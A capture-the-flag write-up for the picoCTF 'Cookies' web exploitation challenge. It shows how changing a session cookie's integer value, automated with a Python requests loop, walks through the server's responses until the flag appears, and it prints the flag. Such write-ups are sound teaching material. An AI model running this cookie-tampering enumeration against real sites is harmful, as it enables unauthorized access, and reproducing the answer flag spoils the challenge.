# Cookies

**Author:** [yairp03](https://github.com/yairp03)  
**Category:** Web Exploitation  
**Points:** 40

# Challenge

## Description

Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:21485/

# Solution

The challenge is called `Cookies` so we can assume that we need to use cookies to solve it. We can view and edit the cookies in many ways, here i'll use the [EditThisCookie](/Guides/Tools/EditThisCookie.md) extension for chrome.

Viewing the cookies we can see that there is a cookie called `name` with the value `-1`. The website has a textbox with a placeholder that says `snickerdoodle`, and a search button. Writing `snickerdoodle` in the textbox and clicking the search button gives us another page, with the text `I love snickerdoodle cookies!`.

Checking our `name` cookie, we can see that it has changed to `0`. Let's change it to `1`, refresh the page and see what happens. We get the same page as before, but now the text is `I love chocolate chip cookies!`. We can continue to increment the value of the cookie and get more cookie names, and we can assume that eventually we'll get the flag.

We can't know how many times we need to increment the cookie, so we can use python's [requests](https://pypi.org/project/requests/) module to automate the process:

```python
import requests

URL = "http://mercury.picoctf.net:21485/"
BEFORE_RESULT = '<p style="text-align:center; font-size:30px;">'
AFTER_RESULT = '</p>'

curr_cookie = ''
i = -1
while 'picoCTF' not in curr_cookie:
    i += 1
    res = requests.get(URL, cookies={'name': str(i)})
    curr_cookie = res.text[res.text.find(BEFORE_RESULT) + len(BEFORE_RESULT):]
    curr_cookie = curr_cookie[:curr_cookie.find(AFTER_RESULT)]
    print(i, curr_cookie)

flag = curr_cookie[curr_cookie.find('picoCTF'):curr_cookie.find('}') + 1]
print('Flag: ', flag)
```

And finally, after 18 cookies, we get the flag:

```bash
$ python3 solve.py
0 <b>I love snickerdoodle cookies!</b>
1 <b>I love chocolate chip cookies!</b>
2 <b>I love oatmeal raisin cookies!</b>
...
17 <b>I love wafer cookies!</b>
18 <b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code>
Flag:  picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
```

**The Flag:** `picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}`
